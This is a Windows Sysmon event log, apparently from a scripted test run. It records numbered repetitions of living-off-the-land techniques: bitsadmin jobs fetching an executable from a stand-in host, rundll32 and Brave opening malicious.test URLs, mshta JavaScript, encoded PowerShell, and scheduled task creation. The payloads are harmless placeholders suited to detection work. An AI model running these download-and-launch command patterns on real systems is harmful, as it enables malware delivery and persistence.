Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d1-6928-5013-000000000b00}
ParentProcessId: 13052
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/31 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:06 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:06.578
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask31
CreationUtcTime: 2025-11-27 18:05:06.578
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:06 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:06.358
ProcessGuid: {3a35410f-92d2-6928-5f13-000000000b00}
ProcessId: 14924
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADEAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:06 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:06.180
ProcessGuid: {3a35410f-92d2-6928-5d13-000000000b00}
ProcessId: 600
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:06 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.938
ProcessGuid: {3a35410f-92d1-6928-5b13-000000000b00}
ProcessId: 14672
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job31 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.795
ProcessGuid: {3a35410f-92d1-6928-5913-000000000b00}
ProcessId: 12260
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job31 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.713
ProcessGuid: {3a35410f-92d1-6928-5713-000000000b00}
ProcessId: 5592
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job31 http://example.com/file.exe C:\Temp\file31.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.603
ProcessGuid: {3a35410f-92d1-6928-5413-000000000b00}
ProcessId: 11472
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job31 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.569
ProcessGuid: {3a35410f-92d1-6928-5213-000000000b00}
ProcessId: 12892
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask31 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.514
ProcessGuid: {3a35410f-92d1-6928-5113-000000000b00}
ProcessId: 7456
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask31 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:05.458
ProcessGuid: {3a35410f-92d1-6928-5013-000000000b00}
ProcessId: 13052
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/31 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:05 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:05.165
ProcessGuid: {3a35410f-92d0-6928-4813-000000000b00}
ProcessId: 15284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_dbgzz1g3.pi3.ps1
CreationUtcTime: 2025-11-27 18:05:05.165
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:04.579
ProcessGuid: {3a35410f-92d0-6928-4f13-000000000b00}
ProcessId: 11740
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=46 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11595273261 --metrics-shmem-handle=7472,i,12319948014749330218,2697053055369062405,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709029415796548 --mojo-platform-channel-handle=6188 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:04.528
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92d0-6928-4e13-000000000b00}
TargetProcessId: 13596
TargetImage: <unknown process>
NewThreadId: 7940
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:04.448
ProcessGuid: {3a35410f-92d0-6928-4d13-000000000b00}
ProcessId: 5408
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test31') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:04.332
ProcessGuid: {3a35410f-92d0-6928-4c13-000000000b00}
ProcessId: 13400
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d0-6928-4913-000000000b00}
ParentProcessId: 14752
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/30
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:04.131
ProcessGuid: {3a35410f-92d0-6928-4913-000000000b00}
ProcessId: 14752
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/30
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92cf-6928-3913-000000000b00}
ParentProcessId: 6232
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/30 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:04 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:04.040
ProcessGuid: {3a35410f-92d0-6928-4813-000000000b00}
ProcessId: 15284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADAAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:03.894
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask30
CreationUtcTime: 2025-11-27 18:05:03.894
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.842
ProcessGuid: {3a35410f-92cf-6928-4713-000000000b00}
ProcessId: 6372
Image: C:\Windows\System32\SecurityHealthHost.exe
FileVersion: 4.18.1907.16384 (WinBuild.160101.0800)
Description: Windows Security Health Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SecurityHealthHost.exe
CommandLine: C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=BC84EF67269A2AEF02EBA5AA8FB69BEC,SHA256=08C05285CE0BA345A39C08D70D6686706CDCB847A220A1CA34F5BFECC8CD8857,IMPHASH=4E28FDA241BEFA94F219E0683850258F
ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00}
ParentProcessId: 848
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.811
ProcessGuid: {3a35410f-92cf-6928-4513-000000000b00}
ProcessId: 8804
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:03 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:03.755
ProcessGuid: {3a35410f-92cf-6928-4413-000000000b00}
ProcessId: 2484
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job30 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
